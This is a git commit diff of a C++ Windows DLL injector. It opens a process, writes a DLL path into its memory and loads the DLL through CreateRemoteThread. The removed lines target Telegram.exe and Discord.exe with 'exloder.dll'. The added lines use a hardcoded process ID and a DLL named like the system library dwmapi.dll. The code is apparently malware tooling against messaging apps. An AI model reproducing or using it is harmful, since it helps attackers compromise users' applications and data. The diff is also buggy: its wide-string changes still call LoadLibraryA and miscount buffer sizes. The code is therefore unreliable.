9a83ffa1d3a391610bc3edd4b2686d6978c61405
Administrator <www.www.www.com.rus@gmail.com>
2024-08-31 16:07:23 +0300

    wchar -не работает:(

--- indjector_dll/Source.cpp
+++ indjector_dll/Source.cpp
@@ -3,18 +3,17 @@
 #include <iostream>
 #include <io.h>
 #include <shlwapi.h>
-#define _alloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size + 64)
-#define _free(mem) if (mem) HeapFree(GetProcessHeap(), 0, mem)
-DWORD GetProcessByName(const char* process_name)
+
+DWORD GetProcessByName(const WCHAR* process_name)
 {
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 process;
     DWORD proc_id = 0;
-    if (Process32First(snapshot, &process))
+    if (Process32FirstW(snapshot, &process))
     {
-        while (Process32Next(snapshot, &process))
+        while (Process32NextW(snapshot, &process))
         {
-            if (_stricmp(process.szExeFile, process_name) == 0)
+            if (_wcsicmp(process.szExeFile, process_name) == 0)
             {
                 proc_id = process.th32ProcessID;
                 break;
@@ -25,33 +24,36 @@ DWORD GetProcessByName(const char* process_name)
     return proc_id;
 }
 
-bool FileExist(char* name)
+bool FileExist(WCHAR* name)
 {
-    return _access(name, 0) != -1;
+    return _waccess(name, 0) != -1;
 }
 
-bool Inject(DWORD pID, char* path)
+bool Inject(DWORD pID, WCHAR* path)
 {
     HANDLE proc_handle;
     LPVOID RemoteString;
     LPCVOID LoadLibAddy;
 
     if (pID == 0)
+        
         return false;
 
     proc_handle = OpenProcess(PROCESS_ALL_ACCESS, false, pID);
     if (proc_handle == 0)
+        
         return false;
-
+   
     
 
-    RemoteString = VirtualAllocEx(proc_handle, NULL, strlen(path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(proc_handle, RemoteString, path, strlen(path) + 1, NULL);
+    RemoteString = VirtualAllocEx(proc_handle, NULL, wcslen(path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(proc_handle, RemoteString, path, wcslen(path) + 1, NULL);
 
-    LoadLibAddy = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+    LoadLibAddy = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
     HANDLE az = CreateRemoteThread(proc_handle, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, RemoteString, NULL, NULL);
     if (az == NULL) {
         std::cout << "[-] Could create new thread. Error code: " << GetLastError();
+       
         return -1;
     }
 
@@ -64,21 +66,21 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 {
    
 
-    char process_name[32];
-    char dll_name[32] = {"exloder.dll"};
-    char path[256];
-    DWORD pID;
+    WCHAR process_name[256];
+    WCHAR dll_name[256] = {L"dwmapi.dll"};
+    WCHAR path[256];
+    DWORD pID = 7268;
     
-    pID = GetProcessByName("Telegram.exe");
+    /*pID = GetProcessByName(L"Telegram.exe");
     if (pID == 0)
     {
-        pID = GetProcessByName("Discord.exe");
+        pID = GetProcessByName(L"Discord.exe");
         if (pID == 0)
         {
-            exit(1);
+            MessageBox(NULL, L"lox", NULL, MB_ICONERROR);
         }
         
-    }
+    }*/
      
     
   
@@ -88,16 +90,18 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         //printf("Enter DLL name: ");
         //scanf_s("%s", dll_name);
         
-        GetFullPathName(dll_name, sizeof(path), path, NULL);
+        GetFullPathNameW(dll_name, sizeof(path), path, NULL);
         if (FileExist(path))
         {
             printf("DLL found!\n");
+            
             break;
         }
         else
         {
 
             printf("DLL not found!\n");
+            MessageBox(NULL, L"ошибка", NULL, MB_ICONERROR);
             break;
         }
     }
@@ -105,13 +109,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (Inject(pID, path))
     {
         printf("DLL successfully injected!\n");
-        MessageBox(NULL, "инжект успешен", NULL, MB_ICONERROR);
-        exit(1);
+        MessageBox(NULL, L"инжект успешен", NULL, MB_ICONERROR);
+        
     }
     else
     {
         printf("CRITICAL ERROR! \nDestroying window...\n");
-        exit(1);
+        MessageBox(NULL, L"ошибка111", NULL, MB_ICONERROR);
         
     }
+   
 }
